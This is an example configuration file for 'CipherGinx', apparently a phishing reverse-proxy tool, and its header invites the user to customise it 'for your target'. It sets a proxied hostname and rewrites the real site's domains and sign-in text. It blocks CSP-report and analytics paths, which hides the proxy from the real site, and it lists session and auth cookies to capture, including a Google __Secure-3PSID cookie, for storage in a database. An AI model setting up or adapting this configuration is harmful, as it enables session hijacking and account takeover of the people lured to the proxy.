<?php
// CipherGinx PHP - Example Configuration File
// Copy this file and customize for your target

return [
    // Target website configuration
    'hostname' => 'example.com',
    'isSSL' => true,
    'server' => 'localhost',
    'port' => 443,

    // Domain injection - replace domains in requests/responses
    'inject_domain' => [
        ['sub.example.com', 'sub.localhost'],
        ['api.example.com', 'api.localhost'],
    ],

    // Request header modifications
    'req_headers' => [
        // Apply to all paths
        ['', ['Connection' => 'close']],
        // Specific path
        ['/js/app.js', ['Host' => 'sub.example.com']],
        ['/api/', ['Authorization' => 'Bearer MODIFIED']],
    ],

    // Response header modifications
    'resp_headers' => [
        ['', []],
    ],

    // Request body modifications (regex replacement)
    'req_body' => [
        ['/login', 'original_pattern', 'replacement_string'],
    ],

    // Response body modifications
    'resp_body' => [
        ['', 'https://example.com', 'https://localhost'],
        ['/signin', 'Sign in', 'Authenticate'],
    ],

    // Block certain paths (return 200 OK with empty body)
    'block_paths' => [
        '/cspreport',
        '/analytics',
        '/tracking',
    ],

    // Cookies to capture
    'get_cookie' => [
        'SESSIONID',
        'AUTH_TOKEN',
        'ID',
        '__Secure-3PSID',
    ],

    // Database configuration (overrides .env)
    'db_host' => 'localhost',
    'db_port' => 3306,
    'db_name' => 'cipherginx',
    'db_user' => 'root',
    'db_password' => '',
];
